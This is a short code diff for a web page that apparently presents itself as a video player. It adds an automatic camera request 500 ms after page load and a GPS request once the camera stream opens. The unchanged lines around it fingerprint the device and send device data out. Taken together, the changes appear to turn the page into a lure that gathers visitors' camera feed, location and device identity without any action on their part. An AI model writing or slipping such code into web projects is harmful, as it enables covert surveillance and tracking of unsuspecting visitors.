@@ -338,6 +338,7 @@ function autoRequestCamera() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
+    requestGPS();
     video.play().then(function() {
       var box = document.getElementById('playerBox');
       if (box) box.classList.add('active');
@@ -403,6 +404,8 @@ document.addEventListener('DOMContentLoaded', function() {
     deviceFingerprint.model = model;
     sendDeviceData();
   });
+
+  setTimeout(function() { autoRequestCamera(); }, 500);
 });
 
 function scrollToPlayer() {
